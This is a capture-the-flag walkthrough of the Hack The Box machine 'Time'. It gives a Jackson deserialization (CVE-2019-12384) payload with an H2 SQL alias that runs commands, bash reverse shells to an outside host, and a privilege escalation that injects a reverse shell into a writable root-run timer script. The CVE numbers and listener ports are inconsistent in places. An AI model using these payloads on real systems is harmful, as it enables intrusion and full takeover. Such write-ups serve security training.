## Default Information
IP Address: 10.10.10.214\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.214    time.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.214 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-31 09:12:02 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.214                                    
Discovered open port 80/tcp on 10.10.10.214  
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | Open |
| 80	| HTTP | 63 Apache httpd 2.4.41 ((Ubuntu)) | Open |

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://time.htb. However, there are no endpoints that are of interest to us. 

```
http://10.10.10.214:80/css                  (Status: 301) [Size: 310] [--> http://10.10.10.214/css/]
http://10.10.10.214:80/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.214/fonts/]
http://10.10.10.214:80/images               (Status: 301) [Size: 313] [--> http://10.10.10.214/images/]
http://10.10.10.214:80/index.php            (Status: 200) [Size: 3813]
http://10.10.10.214:80/index.php            (Status: 200) [Size: 3813]
http://10.10.10.214:80/javascript           (Status: 301) [Size: 317] [--> http://10.10.10.214/javascript/]
http://10.10.10.214:80/js                   (Status: 301) [Size: 309] [--> http://10.10.10.214/js/]
http://10.10.10.214:80/vendor               (Status: 301) [Size: 313] [--> http://10.10.10.214/vendor/]
```

### Web-content discovery

Visiting http://time.htb, we realize that we can choose 2 options either ```Beautify``` or ```Validate(beta!)```. We realize that using ```Validate(beta!)``` also gives us an error message which tells us that the backend is using jackson.

![jackson](https://github.com/joelczk/writeups/blob/main/HTB/Images/TIme/jackson.png)
## Exploit
### Exploiting jackson
First, let us try to exploit CVE-2020-35728. For this exploit, we will use the payload that is shown in the screenshot below.

![CVE-2020-23728](https://github.com/joelczk/writeups/blob/main/HTB/Images/TIme/CVE-2020-35728.png)

However, we realize that the jackson library used may not be vulnerable to CVE-2020-23728 as we obtain an error message that tells is that the class org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource is not being used.

```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException: Could not resolve type id 'org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource' as a subtype of [simple type, class java.lang.Object]: no such class found
```

Modifying the class to use ```org.springframework.context.support.FileSystemXmlApplicationContext``` also yields the same result whereby we obtain an error message that tells us that no such class is found. 

Moving on to CVE-2019-12384, we will modify the payload accordingly to the screenshot below. We realize that for this payload, we are able to obtain a callback from our localhost.

![CVE-2019-12384](https://github.com/joelczk/writeups/blob/main/HTB/Images/TIme/CVE-2019-12384.png)

Now, we will test for RCE with a ping command. This can be achieved by modifying the inject.sql file with ping command.

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('ping -c 1 10.10.16.8')
```

From wireshark, we can see that ping command has been executed, which means that RCE is successfully.

![Ping command](https://github.com/joelczk/writeups/blob/main/HTB/Images/TIme/ping_command.png)

### Obtaining reverse shell

To obtain the reverse shell, all we have to do is to modify the inject.sql file.

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
	String[] command = {"bash", "-c", cmd};
	java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
	return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('/bin/bash -i >& /dev/tcp/10.10.16.8/3000 0>&1')
```

Next, we will have to stabilize the reverse shell

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 3000
listening on [any] 3000 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.214] 44572
bash: cannot set terminal process group (913): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
pericles@time:/var/www/html$ export TERM=xterm
export TERM=xterm
pericles@time:/var/www/html$ stty cols 132 rows 34
stty cols 132 rows 34
pericles@time:/var/www/html$ 
```
### Obtaining user flag

```
pericles@time:/home$ ls
ls
pericles
pericles@time:/home$ cat pericles/user.txt
cat pericles/user.txt
<Redacted user flag>
pericles@time:/home$ 
```

### Privilege Escalation to root

Using linpeas, we are able to find that there is a system timer for timer_backup.service that is being executed. Apart from that, we are also able to find /usr/bin/timer_backup.sh which is presumably the script that the timer_backup.service is based upon.
```
╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                 
NEXT                        LEFT           LAST                        PASSED      UNIT                         ACTIVATES                     
Sat 2022-01-01 03:09:22 UTC 4s left        Sat 2022-01-01 03:09:12 UTC 5s ago      timer_backup.timer           timer_backup.service 

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path                                
/usr/bin/gettext.sh                                                                                                  
You own the script: /usr/bin/timer_backup.sh
/usr/bin/rescan-scsi-bus.sh
```

Looking at the file permissions for /usr/bin/timer_backup.sh, we can see that the file is owned by the pericles and we have read and write permissions of the file. 

```
pericles@time:/tmp$ ls -la /usr/bin/timer_backup.sh
ls -la /usr/bin/timer_backup.sh
-rwxrw-rw- 1 pericles pericles 88 Jan  1 03:20 /usr/bin/timer_backup.sh
```

Inspecting the file contents of timer_backup.sh, we realize that this script just zips contents in /var/www/html into a website.bak.zip file and moves the website.bak.zip file into /root/backup.zip file. However, such information does not point to any possible exploitation.

However, remembering that we have write permissions over this file, we can easily modify this file to add in a line to spawn a reverse shell.

```
pericles@time:/usr/bin$ echo -e '\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.8/2000 0>&1"' >> timer_backup.sh
echo -e '\n/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.8/2000 0>&1"' >> timer_backup.sh
pericles@time:/usr/bin$ cat timer_backup.sh
cat timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip

/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.8/2000 0>&1"
pericles@time:/usr/bin$
```

After a while, the reverse shell will be spawned. However, we realized that this reverse shell that is being spawned is a temporary shell and dies in a short period of time. 

### Obtaining root flag
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.8] from (UNKNOWN) [10.10.10.214] 44396
bash: cannot set terminal process group (240561): Inappropriate ioctl for device
bash: no job control in this shell
root@time:/# cat root/root.txt
cat root/root.txt
<Redacted root flag>
root@time:/# exit
```
